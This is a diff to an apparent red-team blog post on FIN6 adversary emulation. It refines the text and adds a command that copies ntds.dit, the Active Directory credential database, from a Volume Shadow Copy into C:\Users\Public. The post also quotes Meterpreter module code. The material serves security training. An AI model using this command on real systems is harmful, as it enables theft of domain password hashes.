@@ -377,7 +377,7 @@ This command will generate Volume Shadow Copy on the Systemn Drive. A Volume Sha
 
 ![]({{site.baseurl}}/assets/img/2023-08-02-FIN6 Adversary Emulation - Phase 1/2023-08-02-3_3_Meterpreter_PSEXEC_VolumeShadowCopy.png){:width="100%"}
 
-Going back to the source code of this module, we access and make a copy of the NTDS.dit since we have the Shadow Copy Name:
+Going back to the source code of this module, we can see that we can now access and make a copy of the NTDS.dit since we have the Shadow Copy Name:
 
 ```rb
   # Copy ntds.dit from the Volume Shadow copy to the Windows Temp directory on the target host
@@ -391,6 +391,10 @@ Going back to the source code of this module, we access and make a copy of the N
       end
       return true
 ```
+
+To make a copy of the NTDS.dit file from the Shadow Copy to the C:\Users\Public directory, execute the following command:
+
+copy [shadow_copy_name]\windows\ntds\ntds.dit C:\Users\Public\ad_ntds.dit
 
 FIN6
 
